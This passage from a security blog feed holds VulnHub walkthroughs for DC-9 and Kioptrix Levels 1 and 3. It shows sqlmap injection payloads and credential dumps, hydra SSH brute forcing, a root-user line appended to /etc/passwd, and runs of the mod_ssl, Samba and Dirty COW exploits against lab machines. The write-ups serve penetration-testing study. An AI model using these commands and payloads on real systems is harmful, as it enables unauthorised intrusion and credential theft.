class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">┌──(root㉿kali)-[/usr/share/wordlists/wfuzz]<br>└─<span class="hljs-comment"># sqlmap -r /root/Desktop/vulnhub/DC-9/DC9 --random-agent --dbms=mysql -D users -T UserDetails -C username,password --dump</span><br>        ___<br>       __H__                                                                                                                                                                                                      <br> ___ ___[)]_____ ___ ___  &#123;1.7.8<span class="hljs-comment">#stable&#125;                                                                                                                                                                          </span><br>|<span class="hljs-string">_ -</span>|<span class="hljs-string"> . [&quot;]     </span>|<span class="hljs-string"> .&#x27;</span>|<span class="hljs-string"> . </span>|<span class="hljs-string">                                                                                                                                                                                         </span><br><span class="hljs-string"></span>|<span class="hljs-string">___</span>|<span class="hljs-string">_  [&quot;]_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">__,</span>|<span class="hljs-string">  _</span>|<span class="hljs-string">                                                                                                                                                                                         </span><br><span class="hljs-string">      </span>|<span class="hljs-string">_</span>|<span class="hljs-string">V...       </span>|<span class="hljs-string">_</span>|<span class="hljs-string">   https://sqlmap.org                                                                                                                                                                      </span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] starting @ 22:27:02 /2023-11-13/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[22:27:02] [INFO] parsing HTTP request from &#x27;/root/Desktop/vulnhub/DC-9/DC9&#x27;</span><br><span class="hljs-string">[22:27:02] [INFO] fetched random HTTP User-Agent header value &#x27;Opera/9.61 (X11; Linux i686; U; ru) Presto/2.1.1&#x27; from file &#x27;/usr/share/sqlmap/data/txt/user-agents.txt&#x27;</span><br><span class="hljs-string">[22:27:02] [INFO] testing connection to the target URL</span><br><span class="hljs-string">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="hljs-string">---</span><br><span class="hljs-string">Parameter: search (POST)</span><br><span class="hljs-string">    Type: time-based blind</span><br><span class="hljs-string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="hljs-string">    Payload: search=1&#x27; AND (SELECT 9453 FROM (SELECT(SLEEP(5)))KFpZ) AND &#x27;pTLE&#x27;=&#x27;pTLE</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Type: UNION query</span><br><span class="hljs-string">    Title: Generic UNION query (NULL) - 6 columns</span><br><span class="hljs-string">    Payload: search=1&#x27; UNION ALL SELECT NULL,CONCAT(0x7170716271,0x50787558766b6c786b7663596d6f6b6f4d455975546751527162447053714a504b52776368594e6e,0x716a787171),NULL,NULL,NULL,NULL-- -</span><br><span class="hljs-string">---</span><br><span class="hljs-string">[22:27:02] [INFO] testing MySQL</span><br><span class="hljs-string">[22:27:02] [INFO] confirming MySQL</span><br><span class="hljs-string">[22:27:02] [INFO] the back-end DBMS is MySQL</span><br><span class="hljs-string">web server operating system: Linux Debian 10 (buster)</span><br><span class="hljs-string">web application technology: Apache 2.4.38</span><br><span class="hljs-string">back-end DBMS: MySQL &gt;= 5.0.0 (MariaDB fork)</span><br><span class="hljs-string">[22:27:02] [INFO] fetching entries of column(s) &#x27;password,username&#x27; for table &#x27;UserDetails&#x27; in database &#x27;users&#x27;</span><br><span class="hljs-string">Database: users</span><br><span class="hljs-string">Table: UserDetails</span><br><span class="hljs-string">[17 entries]</span><br><span class="hljs-string">+-----------+---------------+</span><br><span class="hljs-string"></span>|<span class="hljs-string"> username  </span>|<span class="hljs-string"> password      </span>|<br>+-----------+---------------+<br>|<span class="hljs-string"> marym     </span>|<span class="hljs-string"> 3kfs86sfd     </span>|<br>|<span class="hljs-string"> julied    </span>|<span class="hljs-string"> 468sfdfsd2    </span>|<br>|<span class="hljs-string"> fredf     </span>|<span class="hljs-string"> 4sfd87sfd1    </span>|<br>|<span class="hljs-string"> barneyr   </span>|<span class="hljs-string"> RocksOff      </span>|<br>|<span class="hljs-string"> tomc      </span>|<span class="hljs-string"> TC&amp;TheBoyz    </span>|<br>|<span class="hljs-string"> jerrym    </span>|<span class="hljs-string"> B8m#48sd      </span>|<br>|<span class="hljs-string"> wilmaf    </span>|<span class="hljs-string"> Pebbles       </span>|<br>|<span class="hljs-string"> bettyr    </span>|<span class="hljs-string"> BamBam01      </span>|<br>|<span class="hljs-string"> chandlerb </span>|<span class="hljs-string"> UrAG0D!       </span>|<br>|<span class="hljs-string"> joeyt     </span>|<span class="hljs-string"> Passw0rd      </span>|<br>|<span class="hljs-string"> rachelg   </span>|<span class="hljs-string"> yN72#dsd      </span>|<br>|<span class="hljs-string"> rossg     </span>|<span class="hljs-string"> ILoveRachel   </span>|<br>|<span class="hljs-string"> monicag   </span>|<span class="hljs-string"> 3248dsds7s    </span>|<br>|<span class="hljs-string"> phoebeb   </span>|<span class="hljs-string"> smellycats    </span>|<br>|<span class="hljs-string"> scoots    </span>|<span class="hljs-string"> YR3BVxxxw87   </span>|<br>|<span class="hljs-string"> janitor   </span>|<span class="hljs-string"> Ilovepeepee   </span>|<br>|<span class="hljs-string"> janitor2  </span>|<span class="hljs-string"> Hawaii-Five-0 </span>|<br>+-----------+---------------+<br><br>[22:27:02] [INFO] table &#x27;users.UserDetails&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.122.20/dump/users/UserDetails.csv&#x27;<br>[22:27:02] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.122.20&#x27;<br><br>[<span class="hljs-symbol">*</span>] ending @ 22:27:02 /2023-11-13/<br></code></pre></td></tr></table></figure><p>I utilized cut command to organize the data from the database into “user” and “pass” files for subsequent brute-force attacks.</p><p><img src="/2023/04/27/file-upload/image-20231114114012641.png" alt="image-20231114114012641"></p><p>hydra:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">┌──(root㉿kali)-[~/Desktop/vulnhub/DC<span class="hljs-number">-9</span>]<br>└─# hydra -L user -P pass <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span> ssh <br>Hydra v9<span class="hljs-number">.5</span> (c) <span class="hljs-number">2023</span> by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> use <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (<span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> non-binding, these *** ignore laws <span class="hljs-keyword">and</span> ethics anyway).<br><br>Hydra (https:<span class="hljs-comment">//github.com/vanhauser-thc/thc-hydra) starting at 2023-11-13 22:41:38</span><br><span class="hljs-string">[WARNING]</span> Many SSH configurations limit the number of parallel tasks, it <span class="hljs-keyword">is</span> recommended to reduce the tasks: use -t <span class="hljs-number">4</span><br><span class="hljs-string">[WARNING]</span> Restorefile (ignored ...) <span class="hljs-keyword">from</span> a previous session found, to prevent overwriting, ./hydra.restore<br><span class="hljs-string">[DATA]</span> max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">391</span> login tries (l:<span class="hljs-number">17</span>/p:<span class="hljs-number">23</span>), ~<span class="hljs-number">25</span> tries per task<br><span class="hljs-string">[DATA]</span> attacking ssh:<span class="hljs-comment">//192.168.122.20:22/</span><br><span class="hljs-string">[22]</span>[ssh] host: <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span>   login: chandlerb   password: UrAG0D!<br><span class="hljs-string">[22]</span>[ssh] host: <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span>   login: joeyt   password: Passw0rd<br><span class="hljs-string">[STATUS]</span> <span class="hljs-number">357.00</span> tries/min, <span class="hljs-number">357</span> tries <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>:<span class="hljs-number">01</span>h, <span class="hljs-number">35</span> to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>:<span class="hljs-number">01</span>h, <span class="hljs-number">15</span> active<br><span class="hljs-string">[22]</span>[ssh] host: <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span>   login: janitor   password: Ilovepeepee<br><span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">3</span> valid passwords found<br><span class="hljs-string">[WARNING]</span> Writing restore file because <span class="hljs-number">1</span> <span class="hljs-keyword">final</span> worker threads did <span class="hljs-keyword">not</span> complete until end.<br><span class="hljs-string">[ERROR]</span> <span class="hljs-number">1</span> target did <span class="hljs-keyword">not</span> resolve <span class="hljs-keyword">or</span> could <span class="hljs-keyword">not</span> be connected<br><span class="hljs-string">[ERROR]</span> <span class="hljs-number">0</span> target did <span class="hljs-keyword">not</span> complete<br>Hydra (https:<span class="hljs-comment">//github.com/vanhauser-thc/thc-hydra) finished at 2023-11-13 22:42:46</span><br></code></pre></td></tr></table></figure><ul><li>chandlerb&#x2F;UrAG0D!</li><li>joeyt&#x2F;Passw0rd</li><li>janitor&#x2F;Ilovepeepee</li></ul><p>I logged in all three accounts and finally found something interesting with user janitor:</p><p><img src="/2023/04/27/file-upload/image-20231114115006218.png" alt="image-20231114115006218"></p><p>check this directory:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">janitor<span class="hljs-variable">@dc</span><span class="hljs-number">-9</span><span class="hljs-symbol">:~/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>ls<br>passwords-found-on-post-it-notes.txt<br>janitor<span class="hljs-variable">@dc</span><span class="hljs-number">-9</span><span class="hljs-symbol">:~/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>cat passwords-found-on-post-it-notes.txt <br><span class="hljs-title class_">BamBam01</span><br><span class="hljs-title class_">Passw0rd</span><br>smellycats<br><span class="hljs-title class_">P0Lic</span><span class="hljs-comment">#10-4</span><br><span class="hljs-title class_">B4</span>-<span class="hljs-title class_">Tru3</span><span class="hljs-number">-001</span><br><span class="hljs-number">4</span>uGU5T-<span class="hljs-title class_">NiGHts</span><br></code></pre></td></tr></table></figure><p>some new passwords! Add to our pass list and try hydra again:</p><p><img src="/2023/04/27/file-upload/image-20231114115744136.png" alt="image-20231114115744136"></p><p>We got a new user fredf.</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs elixir">fredf<span class="hljs-variable">@dc</span><span class="hljs-number">-9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>ls -al /home/fredf/<br>total <span class="hljs-number">12</span><br>drwx------  <span class="hljs-number">3</span> fredf fredf <span class="hljs-number">4096</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">14</span> <span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span> .<br>drwxr-xr-x <span class="hljs-number">19</span> root  root  <span class="hljs-number">4096</span> <span class="hljs-title class_">Dec</span> <span class="hljs-number">29</span>  <span class="hljs-number">2019</span> ..<br>lrwxrwxrwx  <span class="hljs-number">1</span> fredf fredf    <span class="hljs-number">9</span> <span class="hljs-title class_">Dec</span> <span class="hljs-number">29</span>  <span class="hljs-number">2019</span> .bash_history -&gt; /dev/null<br>drwx------  <span class="hljs-number">3</span> fredf fredf <span class="hljs-number">4096</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">14</span> <span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span> .gnupg<br>fredf<span class="hljs-variable">@dc</span><span class="hljs-number">-9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> fredf on dc<span class="hljs-number">-9</span>:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span><br><br><span class="hljs-title class_">User</span> fredf may run the following commands on dc<span class="hljs-number">-9</span>:<br>    (root) <span class="hljs-symbol">NOPASSWD:</span> /opt/devstuff/dist/test/test<br></code></pre></td></tr></table></figure><p>It’s evident that we can execute &#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test&#x2F;test in root privilege.</p><p>Let’s dig deeper.</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vim">fredf@dc-<span class="hljs-number">9</span>:/home/janitor/.secrets-<span class="hljs-keyword">for</span>-putin$ /<span class="hljs-keyword">opt</span>/devstuff/dist/test/test<br>Usage: <span class="hljs-keyword">python</span> test.<span class="hljs-keyword">py</span> <span class="hljs-keyword">read</span> <span class="hljs-keyword">append</span><br>fredf@dc-<span class="hljs-number">9</span>:/home/janitor/.secrets-<span class="hljs-keyword">for</span>-putin$ <span class="hljs-keyword">find</span> / -name test.<span class="hljs-keyword">py</span> -<span class="hljs-built_in">type</span> <span class="hljs-keyword">f</span> <span class="hljs-number">2</span>&gt;/dev/null <br>/<span class="hljs-keyword">opt</span>/devstuff/test.<span class="hljs-keyword">py</span><br>/usr/lib/<span class="hljs-keyword">python3</span>/dist-packages/setuptools/<span class="hljs-keyword">command</span>/test.<span class="hljs-keyword">py</span><br>fredf@dc-<span class="hljs-number">9</span>:/home/janitor/.secrets-<span class="hljs-keyword">for</span>-putin$ <span class="hljs-keyword">cat</span> /<span class="hljs-keyword">opt</span>/devstuff/test.<span class="hljs-keyword">py</span><br>#!/usr/bin/<span class="hljs-keyword">python</span><br><br>import sys<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span> (sys.<span class="hljs-built_in">argv</span>) != <span class="hljs-number">3</span> :<br>    <span class="hljs-keyword">print</span> (<span class="hljs-string">&quot;Usage: python test.py read append&quot;</span>)<br>    sys.<span class="hljs-keyword">exit</span> (<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">else</span> :<br>    <span class="hljs-keyword">f</span> = <span class="hljs-keyword">open</span>(sys.<span class="hljs-built_in">argv</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;r&quot;</span>)<br>    output = (<span class="hljs-keyword">f</span>.<span class="hljs-keyword">read</span>())<br><br>    <span class="hljs-keyword">f</span> = <span class="hljs-keyword">open</span>(sys.<span class="hljs-built_in">argv</span>[<span class="hljs-number">2</span>], <span class="hljs-string">&quot;a&quot;</span>)<br>    <span class="hljs-keyword">f</span>.<span class="hljs-keyword">write</span>(output)<br>    <span class="hljs-keyword">f</span>.<span class="hljs-keyword">close</span>()<br></code></pre></td></tr></table></figure><p>It seems that test.py file is the “key” to the root. Test.py is used to append the content of file A to another file B(root privilege). The most direct approach is to modify &#x2F;etc&#x2F;passwd.</p><p>generate the passwd:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(root㉿kali)-[~<span class="hljs-regexp">/Desktop/</span>vulnhub/DC-<span class="hljs-number">9</span>]<br>└─<span class="hljs-comment"># openssl passwd -1 -salt ry4n 123456</span><br><span class="hljs-variable">$1</span><span class="hljs-variable">$ry4n</span><span class="hljs-variable">$S75u7SLn8eSw62A1NbqTj</span>/<br></code></pre></td></tr></table></figure><p>append user to &#x2F;etc&#x2F;passwd file:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ruby">fredf<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>echo <span class="hljs-string">&#x27;ry4n:$1$ry4n$S75u7SLn8eSw62A1NbqTj/:0:0::/root:/usr/bin/bash&#x27;</span> &gt; <span class="hljs-regexp">/tmp/ry</span>4n<br>fredf<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>sudo /opt/devstuff/dist/test/test /tmp/ry4n /etc/passwd<br>fredf<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>su ry4n<br><span class="hljs-title class_">Password</span>: <br>root<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-comment"># id</span><br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br>root<span class="hljs-variable">@dc</span>-<span class="hljs-number">9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>ROOT IT!</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_kioptrix_level_1</title>
    <link href="/2024/07/23/vulnhub_kioptrix_level_1/"/>
    <url>/2024/07/23/vulnhub_kioptrix_level_1/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-kioptrix-level-1"><a href="#vulnhub-kioptrix-level-1" class="headerlink" title="vulnhub_kioptrix_level_1"></a>vulnhub_kioptrix_level_1</h1><p>In the coming period, I will progressively update write-ups on various OSCP-LIKE machines, and this is my first write-up on vulnhub.</p><p>Firstly, alter the machine’s network connectivity mode to NAT and use <strong>arp-scan</strong> to acquire its IP address (this tool is highly efficient and convenient).</p><p>(-l param means localnet)</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102132027468.png" alt="image-20231102132027468"></p><p>The target is 192.168.122.12.</p><p>The process of conducting a comprehensive port scan with <strong>nmap</strong> is quite time-consuming. Therefore, I prefer to utilize <strong>masscan</strong> initially to identify the open ports and subsequently perform a detailed scan with nmap.</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102132503180.png" alt="image-20231102132503180"></p><p>then it comes to nmap:</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102132553091.png" alt="image-20231102132553091"></p><p>nmap -sC -sS -sV -A -p 22,80,111,139,443,1024 192.168.122.12</p><p>What interests me most is the HTTP service running on port 80.</p><p>Now it’s time for <strong>dirsearch</strong> and <strong>nikto</strong>.</p><p>dirsearch for directory bruteforce:</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102133323051.png" alt="image-20231102133323051"></p><p>nothing interesting except &#x2F;usage:</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102133456170.png" alt="image-20231102133456170"></p><p>The tiny text at the bottom caught my attention：”generated by <strong>Webalizer</strong> Version 2.01”</p><p>I attempted to acquire something useful via searchsploit, preferably directly identifying exploitable vulnerabilities.</p><p>unfortunately：</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102133925008.png" alt="image-20231102133925008"></p><p>Let’s turn to nikto!</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102134035623.png" alt="image-20231102134035623"></p><p>It brings me a lot:</p><ul><li>outdated mod_ssl,apache,openssl</li><li>&#x2F;test.php</li><li>some php backdoor file manager(all of these are False Positives XD)</li></ul><p>The &#x2F;test.php page simply displays “TEST” without any other info, skip skip skip. Currently, the remaining that have not been tested are <strong>mod_ssl</strong>, Apache, and others.</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102134702818.png" alt="image-20231102134702818"></p><p>BINGO! Here comes several BOF vulnerabilities. I select <code>Apache mod_ssl &lt; 2.8.7 OpenSSL — ‘OpenFuckV2.c’ Remote Buffer Overflow (2)</code>, and then use -m param to copy it to my own dir.</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102134959536.png" alt="image-20231102134959536"></p><p>The usage of this script is indicated in the comments, but a error stopped me when I follow the command :<code>fatal error: openssl/ssl.h: No such file or directory</code> . No worries, just simply download it by <code>apt-get install libssl-dev``. However , a new issue has arisen as some functionalities have been deprecated. By consulting GPT, I found way to resolve it : adding the </code>-Wno-deprecated-declarations&#96; flag to ignore warnings. Now we can finally successfully compile it :</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102140039760.png" alt="image-20231102140039760"></p><p>The remaining steps are truely smooth. Simply follow the instructions and execute the exp — — Successfully gain access to root privileges !</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102140150839.png" alt="image-20231102140150839"></p><p>Wait Wait Wait 😝</p><p>Messages above are all about HTTP service on port 80, why not give SMB a try ? (Remembering that nmap scan tells us not only port 80 is open)</p><p>enum4linux — nothing:</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102141009194.png" alt="image-20231102141009194"></p><p>smbclient — nothing:</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102141130174.png" alt="image-20231102141130174"></p><p>Ultimately, utilize the MSF to detect the version of the SMB protocol.</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102141422083.png" alt="image-20231102141422083"></p><p>Samba 2.2.1a, turn to searchsploit:</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102141513795.png" alt="image-20231102141513795"></p><p>Perfect ! There exists a exploit script in MSF :</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102141650432.png" alt="image-20231102141650432"></p><p>Everything appears to be progressing smoothly, but I am still unable to obtain a shell. The scenario appears in the provided image, where the shell connection is established but consistently interrupted, is highly likely to be attributed to a mismatch between the targets or payloads.</p><p>Let’s attempt to ultilize a more common payload: shell&#x2F;reverse_tcp instead of meterpreter&#x2F;reverse_tcp.</p><p><img src="/2023/04/27/file-upload/trix_level_1/image-20231102142207965.png" alt="image-20231102142207965"></p><p>🎉🎉🎉</p><p>Welcome to communicate with me. Everything !</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_kioptrix_level_3</title>
    <link href="/2024/07/23/vulnhub_kioptrix_level_3/"/>
    <url>/2024/07/23/vulnhub_kioptrix_level_3/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-kioptrix-level-3"><a href="#vulnhub-kioptrix-level-3" class="headerlink" title="vulnhub_kioptrix_level_3"></a>vulnhub_kioptrix_level_3</h1><p>Here comes another walkthrough on KIOPTRIX series!</p><p>First off, we ought to modify &#x2F;etc&#x2F;hosts file and add the following line:</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.122.14</span> #your target ip  kioptrix3.com<br></code></pre></td></tr></table></figure><p>Let’s start with some routine scan.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">masscan</span> -p1-<span class="hljs-number">65535</span> <span class="hljs-number">192.168.122.14</span> --rate=<span class="hljs-number">1000</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106151902727.png" alt="image-20231106151902727"></p><p><code>nmap -sC -sS -sV -A -p 22,80 192.168.122.14</code></p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231109085916455.png" alt="image-20231109085916455"></p><p>There’re only two open ports: port 22 and port 80.</p><p>Clearly, it’s evident that we need to focus on HTTP service.</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nikto</span> -h <span class="hljs-number">192.168.122.14</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106152403497.png" alt="image-20231106152403497"></p><p>Sevaral results capture my interest which could have vulnerabilities, such as phpmyadmin(MYSQL).</p><p>Access it using firefox and attempt to login by brute force:</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106153305168.png" alt="image-20231106153305168"></p><p>Unfortunately, it doesn’t work.</p><p>For the next step, I intend to directly access http server on port 80:</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106153753112.png" alt="image-20231106153753112"></p><p>At the top of this page, there are three modules that can be observed:HOME, BLOG, and LOGIN.</p><p>After some experimentation, I have discovered a suspicious feature point where there may be a potential vulnerability for SQL injection — — sort.</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106154444619.png" alt="image-20231106154444619"></p><p>Take a look at the url, the param ID interests me.</p><p>Let me perform a simple test by appending a <code>&#39;</code> after the parameter. An error has occurred!</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106155105908.png" alt="image-20231106155105908"></p><p>SQLMAP:</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">sqlmap</span> <span class="hljs-operator">-</span><span class="hljs-variable">u</span> <span class="hljs-string">&quot;http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=size#photos&quot;</span> <span class="hljs-operator">-</span><span class="hljs-built_in">D</span> <span class="hljs-variable">gallery</span> <span class="hljs-operator">-</span><span class="hljs-variable">T</span> <span class="hljs-type">dev_accounts</span> <span class="hljs-operator">-</span><span class="hljs-built_in">C</span> <span class="hljs-variable">username</span><span class="hljs-operator">,</span><span class="hljs-variable">password</span> <span class="hljs-operator">--</span><span class="hljs-variable">dump</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106155327482.png" alt="image-20231106155327482"></p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106155646715.png" alt="image-20231106155646715"></p><p>So far, I have obtained two accounts which can be successfully used to login using ssh.</p><p>Do you remember the login page on the homepage we haven’t access? Now let’s do it.</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106160547043.png" alt="image-20231106160547043"></p><p>After unsuccessful attempts to access the backend using methods such as sql injection and brute force, I noticed the presence of ‘LotusCms’.</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">searchsploit LotusCMS</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106161007373.png" alt="image-20231106161007373"></p><p>Download the exp from google and then execute:</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106161303607.png" alt="image-20231106161303607"></p><p>We can also obtain a shell as well, however, the privilege is lower, compared to the previous one.</p><p>An indeed famous vulnerability caught my attention when I finished performing the inspection using linpeas — DIRTY COW.</p><p><img src="/2023/04/27/file-upload/trix_level_3/image-20231106163430745.png" alt="image-20231106163430745"></p><p>I exploited it with firefart’s code.(<a href="https://github.com/firefart/dirtycow">firefart&#x2F;dirtycow: Dirty Cow exploit — CVE-2016–5195 (github.com)</a>)</p><p>Next, let us proceed step by step.</p><p>Compile:</p><figure class="highlight 